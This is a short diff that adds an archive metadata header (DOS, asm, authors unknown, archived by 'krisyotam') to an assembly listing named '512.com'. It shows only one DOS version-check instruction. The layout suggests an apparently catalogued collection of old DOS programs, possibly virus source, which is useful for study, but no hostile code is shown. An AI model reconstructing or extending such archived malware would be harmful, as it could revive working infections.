@@ -1,3 +1,14 @@
+; ------------------------------------------------------------
+; name      0 9
+; type      asm
+; cve       —
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     —
+; ------------------------------------------------------------
 ;PROGRAM NAME:      512.com
 ;-------------------------------------------------
 H00100: MOV    AH,30h
